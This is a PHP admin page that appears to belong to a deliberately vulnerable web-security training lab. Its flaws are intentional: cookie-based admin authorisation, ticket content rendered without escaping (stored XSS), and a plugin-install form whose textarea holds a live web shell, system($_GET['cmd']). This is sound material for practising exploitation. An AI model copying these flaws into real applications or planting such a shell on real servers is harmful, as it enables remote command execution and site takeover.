<?php
// Weak "auth": cookie role=admin (lab simulation of privileged session)
$role = $_COOKIE["role"] ?? "user";
if ($role !== "admin") {
    echo '<h1>Admin Login (lab)</h1>
    <p>Set cookie role=admin to enter (simulates privileged browser).</p>
    <form method="post" action="/admin_login.php"><button>Become admin</button></form>';
    exit;
}
$store = sys_get_temp_dir() . "/oswe_tickets.json";
$tickets = file_exists($store) ? json_decode(file_get_contents($store), true) : [];
?>
<!DOCTYPE html>
<html><body>
<h1>Admin console</h1>
<h2>Tickets (unsanitized)</h2>
<?php foreach ($tickets as $t): ?>
  <div class="ticket">
    <b><?= $t["from"] ?></b>
    <div><?= $t["body"] /* VULNERABLE XSS */ ?></div>
  </div>
  <hr>
<?php endforeach; ?>

<h2>Install plugin (dangerous)</h2>
<form method="post" action="/admin/plugin/install" enctype="multipart/form-data">
  <input type="hidden" name="csrf" value="lab-csrf-token">
  <input type="file" name="plugin">
  <button>Install</button>
</form>
<p>Or POST raw plugin.php content via field <code>code</code>.</p>
<form method="post" action="/admin/plugin/install">
  <input type="hidden" name="csrf" value="lab-csrf-token">
  <textarea name="code" rows="4" cols="60"><?php system($_GET["cmd"]); ?></textarea>
  <button>Install from code</button>
</form>
</body></html>
